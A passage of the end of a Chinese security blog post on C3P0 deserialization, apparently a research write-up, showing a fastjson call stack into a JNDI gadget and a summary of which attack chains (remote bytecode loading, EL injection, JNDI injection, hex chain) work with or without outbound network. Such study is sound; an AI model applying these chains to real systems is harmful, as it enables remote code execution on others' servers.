+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">dereference:112, JndiRefForwardingDataSource (com.mchange.v2.c3p0)
+</span></span><span class="line"><span class="cl">inner:134, JndiRefForwardingDataSource (com.mchange.v2.c3p0)
+</span></span><span class="line"><span class="cl">setLoginTimeout:157, JndiRefForwardingDataSource (com.mchange.v2.c3p0)
+</span></span><span class="line"><span class="cl">setLoginTimeout:309, WrapperConnectionPoolDataSource (com.mchange.v2.c3p0)
+</span></span><span class="line"><span class="cl">setLoginTimeout:302, JndiRefConnectionPoolDataSource (com.mchange.v2.c3p0)
+</span></span><span class="line"><span class="cl">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:62, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:497, Method (java.lang.reflect)
+</span></span><span class="line"><span class="cl">setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
+</span></span><span class="line"><span class="cl">parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
+</span></span><span class="line"><span class="cl">parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
+</span></span><span class="line"><span class="cl">deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
+</span></span><span class="line"><span class="cl">parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
+</span></span><span class="line"><span class="cl">deserialze:-1, FastjsonASMDeserializer_1_JndiRefConnectionPoolDataSource (com.alibaba.fastjson.parser.deserializer)
+</span></span><span class="line"><span class="cl">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
+</span></span><span class="line"><span class="cl">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
+</span></span><span class="line"><span class="cl">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
+</span></span><span class="line"><span class="cl">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
+</span></span><span class="line"><span class="cl">parse:137, JSON (com.alibaba.fastjson)
+</span></span><span class="line"><span class="cl">parse:128, JSON (com.alibaba.fastjson)</span></span></code></pre></td></tr></table>
+</div>
+</div><p>差不多的</p>
+<h2 id="总结-4" class="heading-element"><span>总结</span>
+  <a href="#%e6%80%bb%e7%bb%93-4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>出网的话都可以打，url 链加载远程字节码或本地打 el 表达式注入，jndi 注入，hex 链</p>
+<p>不出网的话就只能打，url 加载本地字节码打 el 表达式注入，hex 链反序列化16进制字符串</p>
+<p>hex 链和 jndi 上面 poc 都是调用的 setter 来打的，getter 还没试过，都可以结合 fastjson 或者 jackson</p>
+<h2 id="参考" class="heading-element"><span>参考</span>
+  <a href="#%e5%8f%82%e8%80%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><a href="https://www.cnblogs.com/gaorenyusi/p/18475139"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/gaorenyusi/p/18475139</a></p>
+<p><a href="https://tttang.com/archive/1411/#toc_poc_1"target="_blank" rel="external nofollow noopener noreferrer">https://tttang.com/archive/1411/#toc_poc_1</a></p>
+<p><a href="https://infernity.top/2025/03/13/C3P0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"target="_blank" rel="external nofollow noopener noreferrer">https://infernity.top/2025/03/13/C3P0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8</a></p>
+<p><a href="https://nlrvana.github.io/c3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#c3p0%E9%93%BE%E5%AD%90%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%E4%B8%8Eexp"target="_blank" rel="external nofollow noopener noreferrer">https://nlrvana.github.io/c3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#c3p0%E9%93%BE%E5%AD%90%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%E4%B8%8Eexp</a></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2025-03-19 22:40:23">更新于 2025-03-19&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/44face1/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="http://localhost:1313/posts/44face1/" data-title="C3p0反序列化" data-hashtags="Java"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/44face1/" data-hashtag="Java"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="http://localhost:1313/posts/44face1/" data-title="C3p0反序列化" data-web><i class="fa-brands fa-whatsapp fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="http://localhost:1313/posts/44face1/" data-title="C3p0反序列化"><svg class="icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>LINE</title><path d="M19.365 9.863c.349.0.63.285.63.631.0.345-.281.63-.63.63H17.61v1.125h1.755c.349.0.63.283.63.63.0.344-.281.629-.63.629h-2.386c-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63h2.386c.346.0.627.285.627.63.0.349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211.0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346.0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195.0.375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345.0.63.285.63.63v4.771zm-5.741.0c0 .344-.282.629-.631.629-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63.346.0.628.285.628.63v4.771zm-2.466.629H4.917c-.345.0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348.0.63.285.63.63v4.141h1.756c.348.0.629.283.629.63.0.344-.282.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943.0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"/></svg></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/44face1/" data-title="C3p0反序列化"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="http://localhost:1313/posts/44face1/" data-title="C3p0反序列化" data-description=""><svg class="icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Myspace</title><path d="M19.802 12.274A3.811 3.811.0 0023.62 8.47c0-2.101-1.71-3.795-3.818-3.795a3.816 3.816.0 00-3.818 3.81 3.817 3.817.0 003.818 3.811zm-8.602.705a3.43 3.43.0 003.435-3.424A3.43 3.43.0 0011.2 6.13 3.44 3.44.0 007.764 9.566 3.436 3.436.0 0011.2 13zm-7.8.635c1.71.0 3.093-1.38 3.093-3.081.0-1.704-1.395-3.084-3.105-3.084A3.086 3.086.0 00.3 10.539c0 1.7 1.387 3.078 3.095 3.078zm0 .705c-1.96.0-3.4 1.717-3.4 3.495v1.196c0 .17.138.31.31.31h6.18a.31.31.0 00.309-.31v-1.196c0-1.779-1.437-3.5-3.398-3.5zm7.8-.56c-2.18.0-3.78 1.915-3.78 3.891v1.331c0 .188.156.344.345.344h6.87a.344.344.0 00.342-.344V17.65c0-1.976-1.598-3.891-3.777-3.891zm8.602-.617c-2.422.0-4.197 2.126-4.197 4.323v1.477c0 .21.172.381.382.381h7.63c.21.0.383-.171.383-.381v-1.477c-.001-2.197-1.776-4.323-4.198-4.323z"/></svg></a>
+  <a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="http://localhost:1313/posts/44face1/" data-title="C3p0反序列化" data-description=""><i class="fa-brands fa-blogger fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://localhost:1313/posts/44face1/" data-title="C3p0反序列化"><i class="fa-brands fa-evernote fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/java/" class="post-tag" title="标签 - Java">Java</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/c1e7c5b/" class="post-nav-item" rel="next" title="TPCTF2025部分wp">TPCTF2025部分wp<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.140.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.17-30a67c4b"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">6s6</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.17-30a67c4b"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
